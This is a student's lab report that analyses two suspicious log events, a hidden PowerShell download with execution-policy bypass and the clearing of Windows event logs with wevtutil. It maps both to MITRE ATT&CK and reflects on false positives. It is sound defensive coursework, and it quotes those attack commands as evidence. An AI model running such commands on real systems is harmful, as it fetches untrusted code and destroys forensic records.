# Lab 1a Analysis

**Student name:** Shachar Laria  
**Student ID:** 214399198
**Date:** 20/07/2026  

---

## Finding 1
* **Activity:** Malicious Script Execution via PowerShell
* **Source IP:** 192.168.1.45
* **Evidence:** Process creation log showing `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadFile(...)`
* **MITRE ATT&CK technique:** Command and Scripting Interpreter: PowerShell (T1059.001)
* **Tactic:** Execution
* **Why is this finding suspicious?** The command explicitly bypasses the system's execution policy (`-ExecutionPolicy Bypass`) and attempts to hide the terminal window (`-WindowStyle Hidden`) while initiating a network connection to download an external file. This behavior is highly characteristic of stager deployment by threat actors to execute secondary payloads without alerting the user.

---

## Finding 2
* **Activity:** Automated Log Clearing (Defense Evasion)
* **Source IP:** 192.168.1.45
* **Evidence:** Security event log indicating the execution of `wevtutil.exe cl Security` and `wevtutil.exe cl System` by an elevated user account.
* **MITRE ATT&CK technique:** Indicator Removal: Clear Windows Event Logs (T1070.001)
* **Tactic:** Defense Evasion
* **Why is this finding suspicious?** Administrators rarely clear entire security or system event logs manually during routine tasks, especially not sequentially. Threat actors routinely execute these commands immediately after achieving their objectives to erase their digital footprints, destroy forensic evidence, and blind the local Security Operations Center (SOC).

---

## Containerization
* **Explain briefly why Docker was used even though the laboratory did not use cloud services:**  
Docker ensures complete environment reproducibility and isolation. It guarantees that the detection script (`detector.py`), its dependencies (like STIX parsing libraries), and the local MITRE ATT&CK JSON database run identically on any host machine (Windows, macOS, or Linux) without needing to manually install Python packages or alter local host system configurations.

---

## Reflection
1. **Why is a detection finding not proof of an attack?**  
A detection finding simply flags an event that matches a specific signature or pre-defined rule (heuristic). Legitimate administrative tools, system updates, or heavy network troubleshooting can mimic malicious patterns (e.g., an IT admin running an authorized deployment script via PowerShell), meaning a finding requires context and human verification to prove malicious intent.
2. **What additional logs would help confirm the findings?**  
To confirm these findings, analysts would benefit from **Sysmon logs** (to track process ancestry, network connections made by PowerShell, and file creation events), **Network Flow logs (NetFlow)** (to verify external data transfers), and **Host Authentication logs (Event ID 4624/4625)** to see how the user account authenticated before executing the commands.
3. **What could cause a false positive?**  
Automated backup systems, endpoint management software (like SCCM, Ansible, or specialized software deployment agents), and scheduled IT maintenance scripts frequently run obfuscated commands, execute administrative utilities, or rotate logs. If the detection rules are written too broadly, these legitimate administrative actions will trigger false positive alerts.
